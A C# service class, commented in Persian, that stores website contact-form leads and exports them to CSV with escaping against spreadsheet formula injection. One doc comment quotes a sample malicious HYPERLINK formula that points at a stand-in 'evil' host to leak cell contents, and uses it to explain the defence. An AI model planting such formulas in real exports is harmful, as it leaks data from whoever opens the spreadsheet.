using System.Globalization;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Up2Ai.Services;

public sealed class Lead
{
    [JsonPropertyName("id")] public string Id { get; set; } = "";
    [JsonPropertyName("at")] public string At { get; set; } = "";     // ISO timestamp
    [JsonPropertyName("name")] public string Name { get; set; } = "";
    [JsonPropertyName("reach")] public string Reach { get; set; } = "";
    [JsonPropertyName("business")] public string Business { get; set; } = "";
    [JsonPropertyName("service")] public string Service { get; set; } = "";
    [JsonPropertyName("need")] public string Need { get; set; } = "";
    [JsonPropertyName("handled")] public bool Handled { get; set; }
}

/// <summary>
/// صندوق لید.
///
/// هر ارسالِ فرم تماس همین‌جا ذخیره می‌شود — صرف‌نظر از این‌که واتساپ/ایمیل پر
/// شده باشد یا نه — تا هیچ لیدی بی‌سروصدا گم نشود. یک فایل JSON ساده است، نه
/// پایگاه‌داده: حجم واقعی (چند ده لید در ماه) توجیه‌کننده‌ی پایگاه‌داده نیست.
///
/// ┌────────────────────────────────────────────────────────────────────────┐
/// │ تفاوت مهم با نسخه‌ی Node: آن‌جا یک «صف درون‌فرآیندی» کافی بود، چون همه‌ی │
/// │ درخواست‌ها در یک پردازه‌ی واحد اجرا می‌شدند. این‌جا ASP.NET درخواست‌ها را │
/// │ هم‌زمان و چندنخی اجرا می‌کند و ممکن است چند نمونه از برنامه هم بالا     │
/// │ باشد، پس قفل واقعیِ فایل لازم است — نه قفل درون‌حافظه‌ای.                │
/// │ این‌جا هر دو گذاشته شده: یک قفل نخی برای داخل همین پردازه، و یک قفل     │
/// │ روی خود فایل (FileShare.None با تلاش مجدد) برای بین پردازه‌ها.          │
/// └────────────────────────────────────────────────────────────────────────┘
/// </summary>
public sealed class LeadStore
{
    private readonly IRecordStore<Lead> _store;

    public LeadStore(StorageFactory storage, ILogger<LeadStore> log)
    {
        // قفل، نوشتنِ اتمی و کنار گذاشتنِ رکوردِ خراب همه در همان لایه‌ی مشترکی
        // است که نوشته‌ها و کاربران پنل هم از آن استفاده می‌کنند — چه روی فایل،
        // چه روی پستگرس.
        _store = storage.Records<Lead>("leads.json", Pg.PgSchema.Leads, l => l.Id,
            l => l.Id.Length > 0 && l.At.Length > 0 && l.Name.Length > 0, log);
    }

    public Task<Lead> AddAsync(string name, string reach, string business, string service, string need) =>
        _store.MutateAsync(leads =>
        {
            var lead = new Lead
            {
                Id = Guid.NewGuid().ToString(),
                At = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ", CultureInfo.InvariantCulture),
                Handled = false,
                Name = name,
                Reach = reach,
                Business = business,
                Service = service,
                Need = need,
            };
            leads.Add(lead);
            return (true, lead);
        });

    /// <summary>تازه‌ترین بالا.</summary>
    public List<Lead> List() =>
        _store.Read()
            .OrderByDescending(l => l.At, StringComparer.Ordinal)
            .ToList();

    public Task<bool> SetHandledAsync(string id, bool handled) =>
        _store.MutateAsync(leads =>
        {
            var lead = leads.FirstOrDefault(l => l.Id == id);
            if (lead is null) return (false, false);
            lead.Handled = handled;
            return (true, true);
        });

    public Task<bool> DeleteAsync(string id) =>
        _store.MutateAsync(leads =>
        {
            var removed = leads.RemoveAll(l => l.Id == id);
            return (removed > 0, removed > 0);
        });

    /// <summary>
    /// خروجی CSV — با BOM تا اکسل فارسی را درست نشان بدهد.
    ///
    /// نکته‌ی امنیتی: محتوای این فایل را *بازدیدکننده‌ها* می‌نویسند (فرم تماس
    /// عمومی است) و بعد مدیر آن را در اکسل باز می‌کند. اکسل هر سلولی را که با
    /// = یا + یا - یا @@ شروع شود «فرمول» می‌فهمد و اجرا می‌کند — حتی وقتی
    /// سلول داخل گیومه باشد. یعنی یک نفر می‌توانست در فیلد نام
    /// `=HYPERLINK("http://evil/"&amp;A1,"باز کن")` بنویسد و روی کامپیوترِ
    /// مدیر اجرا شود. راه‌حل استاندارد (توصیه‌ی OWASP): یک آپاستروف پیش از
    /// این کاراکترها که اکسل آن را «این سلول متن است» می‌فهمد و نمایش هم
    /// نمی‌دهد.
    /// </summary>
    public static string ToCsv(IEnumerable<Lead> leads)
    {
        var fa = new CultureInfo("fa-IR");

        string Esc(string s)
        {
            var v = s ?? "";
            if (v.Length > 0 && (v[0] is '=' or '+' or '-' or '@' or '\t' or '\r'))
                v = "'" + v;
            return "\"" + v.Replace("\"", "\"\"") + "\"";
        }

        var headers = new[] { "تاریخ", "نام", "راه ارتباطی", "کسب‌وکار", "حوزه", "نیاز", "پیگیری شد" };
        var lines = new List<string> { string.Join(",", headers.Select(Esc)) };

        foreach (var l in leads)
        {
            var when = DateTime.TryParse(l.At, CultureInfo.InvariantCulture,
                DateTimeStyles.RoundtripKind, out var dt)
                ? dt.ToLocalTime().ToString(fa)
                : l.At;
            lines.Add(string.Join(",", new[]
            {
                when, l.Name, l.Reach, l.Business, l.Service, l.Need, l.Handled ? "بله" : "خیر",
            }.Select(Esc)));
        }

        return "﻿" + string.Join("\r\n", lines);
    }
}
